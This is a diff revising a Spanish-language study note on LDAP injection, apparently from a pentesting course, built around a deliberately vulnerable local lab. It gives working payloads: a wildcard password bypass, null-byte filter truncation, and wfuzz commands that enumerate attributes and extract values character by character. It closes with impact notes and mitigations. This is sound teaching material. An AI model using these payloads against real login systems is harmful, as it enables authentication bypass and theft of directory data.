@@ -1,172 +1,144 @@
+# Inyección LDAP (LDAP Injection)
+
+LDAP (*Lightweight Directory Access Protocol*) es un protocolo para acceder y gestionar directorios de información — habitualmente usado para autenticación corporativa y gestión de usuarios (Active Directory, OpenLDAP).
+
+La inyección LDAP se produce cuando una aplicación construye consultas LDAP con datos del usuario sin escaparlos, permitiendo al atacante manipular la lógica de esas consultas.
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - LDAP-Injection
----
 
+## Enumeración previa
 
-# Notas
-
-https://www.profesionalreview.com/2019/01/05/ldap/
-
-## Enumeración
-
-**NMAP**
-
-NMAP tiene muchos script para enumerar LDAP.
-Podemos ejecutar un reconocimiento para que enumere con todos los script de LDAP de la siguiente manera:
+### Nmap — scripts LDAP
 
 ```bash
-sudo nmap --script ldap\* -p389 localhost
+sudo nmap --script "ldap*" -p 389 <IP>
 ```
 
+### ldapsearch — consultas manuales
 
-**IDAPSEARCH**
-
-Para la enumeración podemos utilizar al herramienta **ldapserch:**
-
+**Reconocimiento básico:**
 ```bash
-ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
+ldapsearch -x -H ldap://localhost -b dc=example,dc=org \
+  -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
 ```
 
-ESTA ES UN RECONOCIEMIENTO BÁSICO, SE PUEDEN IMPLEMENTAR CONDICIONALES COMO EL SIGUIENTE:
-
-`Esto lo que hace es buscar con el usuario admin, usuarios con descripcion LDAP y lo que sigue`
-
+**Con condiciones (filtros):**
 ```bash
-ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP*))'
+# Buscar usuarios con la descripción "LDAP*" y cn=admin
+ldapsearch -x -H ldap://localhost -b dc=example,dc=org \
+  -D "cn=admin,dc=example,dc=org" -w admin \
+  '(&(cn=admin)(description=LDAP*))'
 ```
 
-
-**LDAPADD**
-
-Esta herramienta nos permite añadir configuración LDAP mediante un archivo, por ejemplo agregar usuarios.
+### ldapadd — añadir entradas desde archivo `.ldif`
 
 ```bash
 ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif
 ```
 
-## Esplotación
-
-LAS PÁGINAS VULNERABLES SUELEN TENER LO SIGUIENTE:
-
-(&
-	(cn=admin)
-	(userPassword=contraseña)
-)
-
-### Uso de *
-
-Si la sentencia no esta bien sanitizada, podemos ingresar en password el * para que quede de la siguiente manera:
-
+Ejemplo de fichero `.ldif`:
 ```
-(&
-	(cn=admin)
-	(userPassword=*)
-)
+dn: uid=usuario1,dc=example,dc=org
+uid: usuario1
+cn: usuario1
+objectClass: top
+objectClass: posixAccount
+objectClass: inetOrgPerson
+userPassword: password123
+mail: usuario1@example.com
+telephoneNumber: 612345678
 ```
 
-Ahora si interceptamos la petición y vemos que por POST mandamos lo siguiente:
+---
 
-Esto da un estado 301 en la respuesta
+## Explotación
+
+Las aplicaciones web vulnerables suelen construir filtros LDAP como:
+
 ```
-user_id=admin&password=*&login=1&submit=Submit
+(&(cn=USUARIO)(userPassword=CONTRASEÑA))
 ```
 
-Si en el usuario ponemos el asterisco despues de una letra, por ejemplo la a de admin nos va a seguir dando el codigo de estado 301.
+### Bypass con comodín `*`
 
-En el caso de que le pongamos una b, que en este caso no hay ningún usuario que empiece por b, entonces nos data una código de estado 200.
+Si la contraseña no se escapa correctamente, usar `*` como comodín:
 
-**DICHO ESTO, PODEMOS CREAR UNA SCRIPT PARA SACAR USUARIOS**
+```
+password = *
+```
 
-### NULL byte
+La consulta resultante `(&(cn=admin)(userPassword=*))` es verdadera para cualquier contraseña. Esto suele devolver un código 301 (redirect) indicando login exitoso, frente a 200 en caso de fallo.
 
-Si la petición es:
+### Enumeración de usuarios con comodín
 
+```
+username = a*   → código 301 (hay usuarios que empiezan por 'a')
+username = b*   → código 200 (no hay usuarios que empiezan por 'b')
+```
+
+Automatizable con `wfuzz` o un script propio para enumerar usuarios carácter a carácter.
+
+---
+
+### Null byte — truncar el filtro
+
+Si la petición genera el filtro:
 ```
 (&(cn=admin)(userPassword=*))
 ```
 
-Lo que se podría hacer es lo siguiente:
+Inyectando un null byte (`%00`) se puede truncar la consulta y hacer que el servidor solo evalúe la primera condición:
 
 ```
-(&(cn=admin))%00)(userPassword=*))
+user_id = admin))%00
 ```
 
-De esta manera solo interpretara `(&(cn=admin))`
-
-**NOS PODEMOS CREAR UNA SCRIPT PARA ENUMERAR USUARIOS**
-
-Por ejemplo podemos hacer fuerza bruta buscando parámetros:
-
+Resultado:
 ```
-(&(cn=admin)(FUZZ=*))%00)(userPassword=*))
+(&(cn=admin))   ← solo se evalúa esto; el resto se ignora
 ```
 
-Buscar parámetros:
-```shell
-wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=bendu)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888
+**Enumeración de atributos con wfuzz:**
+
+```bash
+# Buscar atributos existentes del usuario
+wfuzz -c --hh=550 \
+  -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt \
+  -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' \
+  http://localhost:8888
 ```
 
-Buscar valores de un parámetro
+**Extraer valores de un atributo numérico (ej. teléfono) carácter a carácter:**
 
-```shell
-wfuzz -c --hh=550 -z range,0-9 -d 'user_id=bendu)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
+```bash
+wfuzz -c --hh=550 -z range,0-9 \
+  -d 'user_id=admin)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' \
+  http://localhost:8888
 ```
 
-**ESTO CONSISTE EN IR  SACANDO CARACTER POR CARACTER EL NÚMERO**
+---
 
+## Impacto potencial
 
-# Hack4u
+- Bypass de autenticación sin conocer credenciales
+- Enumeración de usuarios y atributos del directorio
+- Lectura de información sensible (correos, teléfonos, grupos, roles)
+- En casos extremos, modificación de entradas del directorio
 
-Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.
+---
 
-La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.
+## Laboratorio para practicar
 
-Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:
+- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)
 
-- Acceder a información de usuarios o recursos que no debería tener acceso.
-- Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
-- Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.
+> Al construir la imagen Docker, cambiar en el `Dockerfile` la primera línea de `FROM php:7.0-apache` a `FROM php:8.0-apache` para evitar errores de compilación.
 
-Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.
+---
 
-También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.
+## Mitigaciones
 
-A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:
-
-- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)
-
-# Laboratorios
-
-A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:
-
-- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)
-
-
-**NOTA (Actualización 24/04/2023)**: A la hora de clonar el proyecto y hacer un ‘**docker build -t ldap-client-container .**‘, es probable que tras ejecutar la instrucción ‘**apt-get update**‘, os salga un error que os impide construir la imagen correctamente.
-
-Para evitar este problema, tan solo es necesario cambiar en el archivo ‘**Dockerfile**‘ la primera línea de ‘**FROM php:7.0-apache**‘ a ‘**FROM php:8.0-apache**‘. De esta forma, ya no tendréis problemas y el laboratorio se podrá desplegar correctamente:
-
-  
-![[Pasted image 20250418200646.png]]
-
-
-```
-dn: uid=bendu,dc=example,dc=org
-uid: bendu
-cn: bendu
-sn: 3
-objectClass: top
-objectClass: posixAccount
-objectClass: inetOrgPerson
-loginShell: /bin/bash
-homeDirectory: /home/bendu
-uidNumber: 14583102
-gidNumber: 14564100
-userPassword: bendu123
-mail: bendu@bendu.com
-description: Prueba bendu
-telephoneNumber: 634928344
-```
+- Escapar todos los caracteres especiales LDAP en el input: `*`, `(`, `)`, `\`, `NUL`
+- Usar librerías de acceso LDAP que parametricen las consultas
+- Validación de entrada estricta (lista blanca de caracteres permitidos)
+- Ejecutar la aplicación con una cuenta LDAP de solo lectura y mínimos privilegios
+- Monitorizar los logs del servidor LDAP para detectar patrones de inyección
